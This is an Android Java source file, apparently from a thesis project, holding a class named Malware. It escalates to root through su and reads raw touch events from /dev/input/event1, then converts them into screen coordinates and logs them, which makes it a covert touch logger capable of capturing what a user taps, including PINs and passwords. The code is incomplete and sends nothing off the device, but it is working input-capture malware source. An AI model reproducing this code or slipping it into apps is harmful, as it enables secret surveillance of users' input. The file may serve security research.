package com.example.thesis;

import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.LinkedList;
import java.util.Queue;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable{
    private boolean running = false;

    private float widthMultiplier;
    private float heightMultiplier;


    public Malware(int screenX, int screenY) {
        int[] absoluteCoordinates = getAbsoluteCoordinates();
        float absoluteX = absoluteCoordinates[0];
        float absoluteY = absoluteCoordinates[1];

        widthMultiplier = screenX / absoluteX;
        heightMultiplier = screenY / absoluteY;
    }


    @Override
    public void run() {
        Log.i("Malware", "Starting malware!");
        running = true;
        captureTouchEvents();
    }

    public void stop() {
        // TODO: check what happens if it is already destroyed for example by an error.
        running = false;
        Log.i("Malware", "Stopping malware!");
        // getEventProcess.destroy();
        // TODO: make list of bufferedreaders and proccesses that you can turn of when stopped.
        /*
        // TODO: add closing of buffereaders etc...
            bufferedReaderInput.close();
            bufferedReaderErrors.close();
            getEventProcess.destroy();
         */
    }


    /**
     * Captures touch events and saves them as commands into the commands queue.
     * Helpful:
     * https://stackoverflow.com/questions/5711084/java-runtime-getruntime-getting-output-from-executing-a-command-line-program
     * https://stackoverflow.com/questions/18570962/permission-denied-on-rooted-android-phone-with-getevent
     */
    private void captureTouchEvents() {
        // Running command.
        BufferedReader bufferedReader = runRootCommand("od /dev/input/event1");

        // Reading result.
        String line;
        while (running) {
            Queue<String> event = readEvent(bufferedReader);
            ABSCoordinates touchABSCoordinates = getCoordinates(event);
            Coordinates screenCoordinates = convertToScreenCoordinates(touchABSCoordinates);
            Log.i("Malware", "Captured touch: " + screenCoordinates + ", " + touchABSCoordinates);
        }
    }


    private Queue<String> readEvent(BufferedReader bufferedReader) {
        Queue<String> eventLines = new LinkedList<>();
        String endOfEvent = "000003  000071  177777  177777";
        try {
            // Reading lines.
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                if (line.contains(endOfEvent)) {
                    eventLines.add(line);
                    eventLines.add(bufferedReader.readLine());
                    break;
                }
                eventLines.add(line);
            }
        } catch (Exception error) {
            Log.e("Malware ", "Error reading the event lines: " + error.getMessage());
        }
        return eventLines;
    }



    private EventType checkEventType(Queue<String> eventLines) {
        // TODO: add support for dragging: dragging from a1, b1 to a2,  b2 is currently 2 different touch events.
        boolean isX = false;
        boolean isY = false;

        // Checking if there are x and y coordinates.
        while(!eventLines.isEmpty()) {
            String line = eventLines.poll();
            String[] lineSplit = line.split("  ");

            if (lineSplit[6].equals("000065")) {
                isX = true;
            } else if (lineSplit[6].equals("000066")) {
                isY = true;
            }
        }

        // Returing what type of event it was by which coordinates were present.
        if (isX && isY) {
            return EventType.NORMAL;
        } else if (isX && !isY || !isX && isY) {
            Log.i("TODO", "ADD SUPPORT FOR NORMAL DRAGGING: " + EventType.DRAGGING.name());
            return EventType.DRAGGING_LINE;
        } else {
            return EventType.MULTIPLE_TAP;
        }
    }


    public ABSCoordinates getCoordinates(Queue<String> eventLines) {
        // Checking what type of event it was.
        EventType eventType = checkEventType(new LinkedList<>(eventLines));
        if (eventType != EventType.NORMAL) {
            Log.i("Malware", "Currently unsupported eventype: " + eventType.name());
            return new ABSCoordinates(0, 0);
        }

        // Processing input.
        int x = -1000;
        int y = -1000;
        while(!eventLines.isEmpty()) {
            String line = eventLines.poll();
            String[] lineSplit = line.split("  ");

            if (lineSplit[6].equals("000065")) {
                // ABS_MT_POSITION_X == 000065
                x = Integer.parseInt(lineSplit[7], 8);
            } else if (lineSplit[6].equals("000066")) {
                // ABS_MT_POSITION_Y == 000066
                y = Integer.parseInt(lineSplit[7], 8);
            } else if (x != -1000 && y != -1000) {
                ABSCoordinates touchCoordinates = new ABSCoordinates(x, y);
                return touchCoordinates;
            }
        }
        return null;
    }


    public Coordinates convertToScreenCoordinates(ABSCoordinates absCoordinates) {
        int screenX = Math.round(absCoordinates.getAbsX() * widthMultiplier);
        int screenY = Math.round(absCoordinates.getAbsY() * heightMultiplier);
        Coordinates screenCoordinates = new Coordinates(absCoordinates, screenX, screenY);
        return screenCoordinates;
    }


    private BufferedReader runRootCommand(String command) {
        try {
            // Starting process as su.
            ProcessBuilder pb = new ProcessBuilder();
            pb.command("/system/bin/su");
            Process process = pb.start();

            // Sending the command.
            OutputStream outputStream = process.getOutputStream();
            outputStream.write((command + " \n").getBytes());
            outputStream.flush();

            // Buffered readers of outputs and error outputs.
            BufferedReader bufferedReaderInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader bufferedReaderErrors = new BufferedReader(new InputStreamReader(process.getErrorStream()));  // TODO: make it read errors aswell

            return bufferedReaderInput;
        } catch (Exception error) {
            Log.e("Malware", "Error running root command: " + error.getMessage());
        }
        return null;
    }


    private int[] getAbsoluteCoordinates() {
        // TODO: https://stackoverflow.com/questions/28215812/adb-shell-getevent-method-returns-twice-the-value-for-x-and-y-on-nexus-4/28217144#28217144
        try {
            BufferedReader bufferedReader = runRootCommand("getevent -il /dev/input/event1 | grep ABS_MT_POSITION");
            Pattern pattern = Pattern.compile(", max (.+), fuzz");
            int absoluteX = -1000;
            int absoluteY = -1000;

            String line;
            while ((line = bufferedReader.readLine()) != null) {
                Matcher matcher = pattern.matcher(line);
                if (matcher.find()) {
                    if (line.contains("ABS_MT_POSITION_X")) {
                        absoluteX = Integer.parseInt(matcher.group(1));
                    } else {
                        absoluteY = Integer.parseInt(matcher.group(1));
                        bufferedReader.close();
                        return new int[]{absoluteX, absoluteY};
                    }

                } else {
                    Log.e("Malware", "Couldn't find absolute!");  // TODO: for testing, remove later.
                }
            }
            bufferedReader.close();
            return new int[]{absoluteX, absoluteY};
        } catch (IOException error) {
            Log.e("Malware", "Error getting absolute size of screen: " + error.getMessage());
        }
        return null;
    }
}

enum EventType {
    NORMAL,
    DRAGGING_LINE,
    MULTIPLE_TAP,
    DRAGGING
}
